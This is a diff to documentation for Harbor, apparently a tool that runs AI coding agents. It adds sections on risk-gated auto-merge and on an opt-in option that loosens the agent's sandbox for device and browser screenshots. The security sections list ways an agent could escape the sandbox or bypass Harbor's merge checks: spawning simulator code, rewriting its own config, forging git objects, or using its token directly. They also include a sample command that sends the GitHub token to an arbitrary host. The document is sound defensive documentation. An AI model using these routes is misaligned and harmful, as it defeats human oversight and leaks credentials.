@@ -154,6 +154,7 @@ model = "gpt-6-luna"
 | `[hooks.*]` | readiness at `pre_handoff`/`pre_merge`, decision policy at `blocker` | script or skill hooks |
 | `[checks.*]` | none | optional repository commands the skill runs with `harbor workflow checks` |
 | `[github]` | `transport = "rest"` | how the builder reads and writes GitHub: `rest` (built-in helper) or opt-in `mcp` |
+| `[builder]` | absent (off) | opt-in `device_proof` platforms that give a Claude builder paths out of its sandbox for emulator, simulator and local web proof; protect `.harbor/` with Code Owner review on GitHub before enabling it |
 
 Readiness gates only on facts Harbor can verify itself: fresh evidence, hold
 state, PR identity, mergeability and CI (plus feedback when set to `required`).
@@ -162,6 +163,63 @@ receipts for them, and a human still merges by default.
 
 `pipeline.md` keeps `unblock_attempts` and `decision_authors`. Decision mode
 and crash-retry delays come from `workflow.toml`.
+
+### Merge risk (`auto_merge_risks`)
+
+With `merge_mode = "workflow_checked"`, `pre_merge` readiness also requires
+the ticket's effective risk to be listed in `auto_merge_risks`. Three sources
+rate risk, and the effective risk is the **highest** of them:
+
+- the **Linear floor**, set by a person: a `risk:low|medium|high` label, or a
+  `Risk: <tier>` (or `Risk tier: <tier>`) line in the ticket description.
+  It is optional.
+- the **builder's tier** (`skills/risk`), which is required. It is a line that is
+  exactly `Risk tier: low`, `Risk tier: medium` or `Risk tier: high` inside the PR
+  body's `## Risk Analysis` section. That same section must also carry
+  `<!-- harbor:risk-sha:<current head SHA> -->`.
+- the **reviewer's rating** (`skills/review`), which is also required. The
+  reviewer child rates the diff on its own. It does not copy the builder's tier.
+  The rating is the `risk` field of the reviewer's JSON verdict comment.
+
+```markdown
+## Risk Analysis
+Risk tier: low
+Rationale: documentation-only change; reverting is one commit.
+<!-- harbor:risk-sha:0123456789abcdef0123456789abcdef01234567 -->
+```
+
+```json
+{"review":{"head_sha":"0123456789abcdef0123456789abcdef01234567","verdict":"approve","proof_verified":true,"feedback_digest":"…","risk":"low","risk_rationale":"docs only; one-commit revert"}}
+```
+
+Harbor counts a reviewer verdict only when all of these hold:
+
+- it is a PR conversation comment whose whole body is that JSON object;
+- its author is the GitHub login that opened the PR (the delivery identity);
+- its `head_sha` is the PR's current head.
+
+Comments from anyone else are ignored, so they can neither supply the rating
+nor lower or veto it. If any counted verdict for the current head is a
+`reject`, or has a `verdict` or `risk` that is not one of the exact lowercase
+values, the risk is unknown. The same applies to a `review` object with no
+`head_sha`. When several current-head approvals exist, the highest `risk` wins.
+
+No source can lower another. Harbor keeps the highest tier it has seen for the
+run, so a later push or edit cannot drop it. If the builder's tier is missing,
+stale or unparseable, or there is no current-head reviewer approval, the
+effective risk is unknown and the automatic merge fails closed. Harbor does not
+interpret free text.
+
+Limits to know:
+
+- The builder and its reviewer child post with the same GitHub identity. The
+  author check keeps out third parties, but it does not prove that a separate
+  reviewer wrote the verdict.
+- Harbor reads the first 100 PR comments.
+
+So list only the tiers you are willing to merge on the agents' own assessment.
+The defaults, `auto_merge_risks = []` and `merge_mode = "human"`, never
+auto-merge.
 
 ### GitHub transport (`[github]`)
 
@@ -374,6 +432,344 @@ verified, normal supervision re-reads that ticket's attachments from Linear, so
 it can still verify the merge on GitHub and remove the worktree. This read
 happens at most 3 times per run in each supervisor process, at least 60 seconds
 apart. The builder's `pr_url` counts only if Linear lists it as an attachment.
+
+### Device and browser proof (`[builder]`)
+
+A project's own rules often require screenshots from an Android emulator, an
+iOS Simulator or a local web server. A Claude builder's Bash sandbox blocks all
+three by default:
+
+| Tool | Failure inside the default sandbox |
+| --- | --- |
+| `adb start-server`, `adb devices` | `could not install *smartsocket* listener: Operation not permitted` (the adb server cannot bind 127.0.0.1:5037) |
+| `xcrun simctl list`, `simctl io booted screenshot` | `CoreSimulatorService connection became invalid` (the XPC lookup is denied) |
+| `python3 -m http.server`, Metro, Expo, `next dev` | `PermissionError: [Errno 1] Operation not permitted` on `bind` |
+
+To allow them, list the platforms in your workflow copy:
+
+```toml
+[builder]
+device_proof = ["android", "ios", "web"]   # any subset; absent or [] means off
+```
+
+Each platform adds one Claude Code sandbox rule:
+
+| Platform | Adds | What it is for |
+| --- | --- | --- |
+| `android` | `network.allowLocalBinding = true` | the `adb` client reaches the adb server on `127.0.0.1:5037` (and can start it) |
+| `web` | `network.allowLocalBinding = true` | dev servers (`http.server`, Metro, Expo, Next) bind a local port, and clients such as `curl` fetch it |
+| `ios` | `network.allowMachLookup = ["com.apple.CoreSimulator.CoreSimulatorService", "com.apple.CoreSimulator.SimLaunchHost-arm64"]` (`-x86` on an Intel Mac) | `xcrun simctl list`, `install`, `launch` and `io booted screenshot` on a booted simulator |
+
+The iOS names were found live, not guessed. A sandboxed Claude builder had
+every other CoreSimulator service denied. With `CoreSimulatorService` alone,
+the booted simulator showed `liblaunch_sim.dylib could not be opened`, and
+`simctl install booted` said `No devices are booted`. Adding the host's
+`SimLaunchHost` made install, launch and screenshot work. `simdiskimaged`,
+`SimulatorTrampoline`, `SimRenderingServices.*` and
+`SimAudioProcessorServices.*` were not needed, so they are not granted. Only
+the arm64 name was verified, on an Apple silicon Mac.
+
+**Harbor boots the devices, not the builder.** The sandbox cannot be
+narrowed enough to boot devices:
+- An emulator registers Mach services (`bootstrap_check_in`).
+- Booting a simulator needs more CoreSimulator access than the rules above.
+
+So before each launch of a builder with `android` or `ios`, Harbor, running
+outside the sandbox, makes sure one device per platform is up:
+- **Android:** an attached device is used as is. Otherwise Harbor starts the
+  adb server and boots the first AVD by name with
+  `emulator -avd <name> -no-snapshot-save`, then waits up to 4 minutes for
+  `sys.boot_completed`. The emulator keeps running afterwards.
+- **iOS:** a booted simulator is used as is. Otherwise Harbor runs
+  `xcrun simctl boot` and `bootstatus -b` on the first available iPhone of
+  the newest iOS runtime.
+
+Harbor prints the result to its log and appends it to the builder's prompt.
+When a boot fails, the prompt quotes the literal error and tells the builder
+to report it as a blocker instead of working around the sandbox. To use a
+particular device, boot it yourself before Harbor launches the builder.
+
+**Web screenshots with Playwright.** With `web`, a builder can serve the app on
+127.0.0.1 and screenshot it with Playwright inside its sandbox. No extra rule
+is needed, but Chromium must run with `--single-process`:
+
+```js
+const browser = await chromium.launch({ args: ["--single-process"] });
+const page = await browser.newPage({ viewport: { width: 1440, height: 900 } });
+await page.goto("http://127.0.0.1:3000/");
+await page.screenshot({ path: "desktop.png" });
+await page.setViewportSize({ width: 390, height: 844 });
+await page.screenshot({ path: "mobile.png" });
+```
+
+A normal launch dies with
+`bootstrap_check_in org.chromium.Chromium.MachPortRendezvousServer.<pid>: Permission denied (1100)`.
+Chromium registers a Mach service for its child processes, and the sandbox
+allows looking services up but not registering them. In single-process mode,
+use one page and resize it: a second browser context crashed the browser.
+Harbor puts these instructions in the builder's prompt when `web` is enabled.
+
+**What you are trusting the builder with.** Every platform gives the builder's
+commands a path out of the sandbox. The sandbox flags stay set
+(`failIfUnavailable`, `allowUnsandboxedCommands = false`), and the host
+allowlist and writable paths do not change. Even so, a builder with these
+rules can reach hosts and files the sandbox would otherwise block:
+
+- **`android`.** adb talks to a device that runs outside the sandbox.
+  `adb shell curl https://any-host/?t=$GITHUB_TOKEN` reaches any host, with
+  anything the builder can read in the request. `adb push` and `adb pull` move
+  worktree files on and off the device.
+- **`ios`.** CoreSimulatorService runs outside the sandbox and acts for the
+  builder. `xcrun simctl openurl booted https://any-host/...` reaches any host.
+  A probe with only `CoreSimulatorService` allowed ran `simctl openurl`
+  successfully. `xcrun simctl spawn` of a binary the
+  builder compiled for the simulator runs code outside the sandbox, with
+  access to the host filesystem. Treat `ios` as a sandbox escape. It can also
+  install, erase or delete any simulator of the user running Harbor.
+- **`web` (and `android`, which uses the same rule).** `allowLocalBinding`
+  lets every Bash command connect to any local port, not only the dev server.
+  That includes:
+  - the adb server;
+  - Chrome remote-debugging ports;
+  - a Docker TCP socket, which is host root;
+  - databases and other local APIs.
+
+  It also lets the builder listen on `0.0.0.0`, so a server it starts can be
+  reachable from your network.
+
+**Who should enable it.** Enable a platform only when both are true:
+- the machine running Harbor holds nothing the builder must not reach, such
+  as other projects' credentials, a Docker daemon or browsers with debugging
+  ports open;
+- you would accept the builder acting as your user: with its network access
+  and, with `ios`, with its file access.
+
+A dedicated machine or user account for Harbor is the safe setup. Do not
+enable it on a shared workstation, on a machine with production credentials,
+or for repositories whose tickets come from people you do not trust to steer
+the builder.
+
+**No repository control bounds a device-proof builder.** Treat enabling
+`ios` or `android` as letting the builder act as the user who runs Harbor:
+- **`ios`.** `simctl spawn` runs builder-compiled code outside the sandbox with
+  that user's file access. It can rewrite any file the user can, including
+  the main checkout's `.harbor/workflow/workflow.toml`, which widens the grant
+  for every later launch. GitHub branch protection never sees that change.
+- **`android`.** adb gives a path out of the sandbox to the network and to
+  files moved on and off the device.
+
+So no Harbor check and no GitHub setting bounds a builder with these
+platforms. Only enable them where that is acceptable (see "Who should enable
+it").
+
+**Changes that come through a PR.** A builder could also open a PR that grants
+itself `device_proof`, or widens which builders get it through
+`[quota_fallback]`. Harbor's own checks (below) are best effort: the builder
+holds a GitHub token and can write its worktree's git directory, so it can get
+around any check that runs on the builder's machine. What GitHub can enforce
+depends on whether the project tracks `.harbor/`:
+- **`.harbor/` untracked** (Harbor reads it from the main checkout). CODEOWNERS
+  and branch protection on `/.harbor/` do not apply, because no PR touches
+  `.harbor/`. The main checkout, `.harbor/` included, can be written by any
+  code Harbor runs outside the sandbox:
+  - the project's `install_command`, which runs unsandboxed in every new
+    worktree. A low-risk PR that only adds a `postinstall` to `package.json`
+    can edit `<repo_path>/.harbor/workflow/workflow.toml`, auto-merge, and
+    widen the grant on the next worktree;
+  - git hooks (#59);
+  - the `ios` and `android` escapes above.
+- **`.harbor/` tracked.** GitHub branch protection with required Code Owner
+  review on `/.harbor/` makes a PR that touches `.harbor/` need a human
+  approval. A change that lands in `.harbor/` through rename detection, from a
+  PR whose diff touches only other paths, may not trigger Code Owner review.
+  This has not been verified on GitHub. This is the recommended setup for a project that enables
+  `device_proof`. It still does not stop the unsandboxed writes listed above,
+  and it does not bound the device escapes.
+
+To set it up for a tracked `.harbor/`:
+
+1. Add `.github/CODEOWNERS` on the base branch with a line that gives `.harbor/`
+   to a person or team, never to the account whose token the builder uses:
+
+   ```text
+   /.harbor/ @your-org/harbor-admins
+   ```
+
+2. In the repository's Settings → Branches (or Rules → Rulesets), add a rule for
+   the base branch that:
+   - requires a pull request before merging, with at least 1 approval;
+   - requires review from Code Owners;
+   - dismisses stale approvals when new commits are pushed;
+   - blocks force pushes and deletion.
+3. Do not add the builder's account or token to the bypass list. The rule must
+   also apply to administrators if that account is an admin; turn on "Do not
+   allow bypassing the above settings", or leave the account out of a
+   ruleset's bypass list.
+4. Check it: open a test PR that edits `.harbor/` and confirm GitHub shows
+   "Review required" from the code owner.
+
+**What Harbor checks on its own commands (best effort).** These checks stop
+the builder merging a `.harbor/` change by accident through Harbor's own
+commands. They do not stop a builder that means to get around them.
+- **What counts:** any change to a path under `.harbor/`, compared after
+  Unicode NFC normalisation and case folding, so `.HARBOR/` and
+  `.harbor/workflow/WORKFLOW.toml`, which land on the real files on macOS, count
+  too. Two comparisons, and either one counts:
+  - `.harbor/` on the PR's base against what merging the PR would land there,
+    from `git merge-tree --write-tree`. That is the same ort merge GitHub runs,
+    over every merge base. On a git without `--write-tree`, the PR head is
+    compared with every merge base.
+  - every commit in the PR (`base..head`), as a conservative extra. For a
+    merge commit, only the content it introduces itself counts.
+
+  A merge conflict counts as unreadable. Neither comparison models a rebase
+  merge: rebase replays commits with rename detection, which can land an edit
+  to another path in `.harbor/`. So `pr-merge --method rebase` is refused with
+  "human merge required: rebase merges can't be checked for .harbor/ changes"
+  whenever anything under `.harbor/` is tracked at the base, the head or the
+  merge result. Projects that keep `.harbor/` untracked may still rebase.
+  `pr-merge` defaults to `--method squash`, which lands the merge result the
+  check reads.
+- **An untracked `.harbor/`.** Harbor reads the workflow from the main
+  checkout, so a project may keep `.harbor/` untracked. When neither the merge
+  base nor the PR head tracks anything under `.harbor/`, the PR cannot change
+  it and the check passes. A PR that starts tracking `.harbor/` content counts
+  as a change.
+- **SHAs:** both come from GitHub as full SHAs, never from a local
+  `origin/<base>` ref, which a builder can forge with `git tag` or
+  `git update-ref`.
+- **The repository's git config is not read.**
+  - The check runs in a throwaway bare repository that borrows only the object
+    directory of the main repository's git dir. When Harbor runs `pre_merge`
+    itself, it resolves that git dir from the project's `repo_path`, not from
+    the worktree's `.git` file.
+  - The throwaway repository runs no hooks and no fsmonitor, and does not use
+    ssh or `ext::` transports, upload-pack hooks, replacement objects, grafts,
+    commit-graphs or a shallow file.
+  - A commit missing locally is fetched only from Harbor's own URL for the
+    configured repository, with `--upload-pack=git-upload-pack`, into the
+    throwaway repository. The URL's host comes from the configured API URL:
+    - `api.github.com` becomes `github.com`;
+    - `api.<name>.ghe.com` becomes `<name>.ghe.com`;
+    - any other host is GitHub Enterprise Server, which serves git on its API
+      host, and is used unchanged (for example `https://api.corp.example/api/graphql`
+      fetches from `api.corp.example`, never `corp.example`).
+  - The fetch authenticates with Harbor's GitHub token: the same
+    `GITHUB_TOKEN`, `GH_TOKEN` or `github_token_env` variable the REST helper
+    uses. Harbor passes it to git through environment config, as an
+    `http.https://<host>/.extraheader` scoped to that host. It never appears
+    on the command line, and errors are redacted.
+  - With no token, a missing commit fails closed with "no GitHub token is
+    configured".
+  - **Run inside the builder** (`pr-merge`, or `harbor workflow check` started
+    by the builder), the check uses the builder's own environment and
+    executables. Its result is only as trustworthy as the builder.
+- **Unreadable is refused too.** These count as unreadable:
+  - missing commits, or a SHA that does not match the PR head;
+  - any tracked entry whose path case-folds to `.harbor` or anything below it
+    that is not a plain directory (040000) or a regular file (100644 or
+    100755), at the base, the head or the merge result. That covers symlinks
+    and submodules at any depth and in any letter case, such as
+    `.HARBOR -> cfg`, `.harbor/WORKFLOW -> ../cfg` or
+    `.harbor/workflow/config.toml -> ../../cfg.toml`. On macOS, Harbor's
+    runtime would follow those links to files outside `.harbor/`.
+- **Where it runs:**
+  - `pre_merge` in the bundled readiness hook and in `harbor workflow check`;
+  - the builder's merge command, `python -m harbor.github_rest pr-merge N --sha SHA`.
+- **The helper's `api` command is an allowlist.**
+  - Reads (`GET`, `HEAD`) go through when they carry no request body, except
+    on `/graphql`: GraphQL is POST only, so its mutation allowlist always
+    applies.
+  - Writes are allowed only for PR create, PR edit, issue and review comments,
+    replies, reviews and labels, under `/repos/<owner>/<repo>/` for the
+    configured repository. A PR edit (`PATCH pulls/N`) may set only `title`
+    and `body`; `base`, `state` and every other field are refused.
+  - GraphQL mutations are allowed only for `addPullRequestReviewThreadReply`,
+    `resolveReviewThread`, `unresolveReviewThread` and `addComment`. The query
+    is parsed: escapes are decoded, comments stripped and aliases resolved to
+    the real field. Fragments inside a mutation, batches and anything Harbor
+    cannot parse are refused.
+  - A review may only `COMMENT` or `REQUEST_CHANGES`; `APPROVE` is refused.
+  - REST writes are limited to the repository Harbor configured
+    (`HARBOR_GITHUB_REPOSITORY`). The helper's own commands use that
+    repository, a different `--repo` is refused, and with none configured
+    the helper refuses to run. GraphQL calls name their target by node ID,
+    so this limit does not apply to them; reads go through for any
+    repository.
+  - Merges, refs, contents and branch protection are refused there.
+
+**Known ways around Harbor's checks.** For a tracked `.harbor/`, branch
+protection with Code Owner review stops the first four when the PR touches
+`.harbor/` itself (see the rename caveat above). None of them is stopped for an
+untracked `.harbor/`:
+- the GitHub token used directly, for example `curl` to the REST or GraphQL API;
+- the GitHub MCP server's merge tool when `[github] transport = "mcp"`;
+- `git push` to the base branch;
+- the repository's git directory, which the builder can write. Harbor reads
+  its objects but no config, refs or hooks. git does not verify that a loose
+  object's content matches its name when it reads it, so the builder could
+  write content under an existing commit's or tree's ID that hides a
+  `.harbor/` change from the check;
+- the builder's own environment: `PATH`, `PYTHONPATH`, `HARBOR_GIT_DIR` and
+  `HOME`. Wherever the check runs inside the builder, the builder chooses
+  which `git` and which Harbor code run, and which git dir they read;
+- anything Harbor runs outside the sandbox that a merged PR controls (the
+  `install_command`, git hooks), and the `ios` and `android` escapes. These
+  can edit the main checkout directly, so branch protection does not stop
+  them either;
+- Harbor's own owner-approved-merge instruction
+  (`src/harbor/pr_events.py`), which tells the builder to merge with
+  `gh pr merge --match-head-commit`. That command does not go through
+  `pr-merge` or its `.harbor/` check. This predates device proof and is not
+  changed here.
+
+**Fail-closed config.** An unknown platform (`"andriod"`), a repeated
+platform, a value that is not a list of strings, or another key in `[builder]`
+makes the workflow invalid. `harbor start` refuses the project, and
+`harbor doctor` exits 2 with the reason. Absent or empty, the generated
+`--settings` are byte-for-byte what they were before this option existed, and
+Harbor boots nothing.
+
+**Doctor.** `harbor doctor` uses the same decision as the builder launcher.
+It reports the grant whenever any Claude builder of the project could run with
+it:
+- `builder_provider: claude`;
+- either side of a `[quota_fallback]` builder pair;
+- a retained Claude builder session in the ledger, which resumes on Claude
+  even after the project switches to Codex.
+
+It prints `Device proof: <platforms> · applies to Claude builders (<why>)`
+and one `grants ...` line per rule. With Claude possible and nothing
+configured, it prints `Device proof: off (...)`. The section is read with the
+rest of the workflow on every builder launch, so an edit applies on the next
+turn.
+
+**Linux.** Claude Code's settings documentation describes `allowLocalBinding`
+and `allowMachLookup` as macOS-only, and there is no iOS Simulator on Linux.
+On a non-macOS host, `harbor doctor` adds `not effective on this host: ...`,
+and `harbor start` prints the same warning once. Harbor has not been tested
+with this option on Linux.
+
+**Codex builders.** `device_proof` does not change a Codex builder. Harbor
+already runs Codex with `workspace-write` and network access. Under that
+sandbox, `adb start-server`, `adb devices` and a `127.0.0.1` HTTP server plus
+`curl` worked without any change. Codex has no setting for Mach services, so
+`xcrun simctl` fails there (`CoreSimulatorService connection became invalid`)
+and cannot be enabled. When `[builder]` is set and a Codex builder could run,
+`harbor doctor` prints `Device proof: not applied to Codex builders (...)`
+and `harbor start` warns once.
+
+**Proof scope.** Verified on an Apple silicon Mac with Claude Code 2.1.332 and
+Codex CLI 0.170.0. Live haiku builder sessions used Harbor's exact builder
+argv. `codex sandbox` used an equivalent permission profile. A sandboxed
+builder ran `adb -s emulator-5554 exec-out screencap -p` (a 1080 x 2400 PNG)
+and `simctl io booted screenshot` (1206 x 2622). It also ran Playwright
+(`playwright-core` 1.58, headless Chromium 145) with `--single-process` against a
+page on 127.0.0.1, at 1440 x 900 and 390 x 844. Harbor's device check reused
+the running emulator and simulator. Not verified:
+- Linux;
+- an Intel Mac (the `SimLaunchHost-x86` name);
+- Harbor cold-booting an emulator or simulator (both were already running).
 
 ### Editing mid-run
 
@@ -597,6 +993,7 @@ against a throwaway repository and worktree; not run on Linux.
 | Watchdog | watchdog.py, db.py | test_watchdog.py |
 | Bounded decisions | unblock.py, decision_policy.py, risk_evidence.py | test_decision_policy.py, test_blocker_recovery.py, test_workflow_evidence.py |
 | Cleanup | workflow_lifecycle.py, worktree.py | test_workflow_cleanup_policy.py, test_merge_cleanup.py |
+| Device and browser proof | config/workflow.py, runner/claude.py, device_proof.py, device_boot.py, readiness.py, cli.py | test_device_proof.py |
 
 Run `uv run pytest`, `uv run python -m compileall -q src tests` and `uv build`.
 The tests use mock external tickets and real local subprocesses and Git
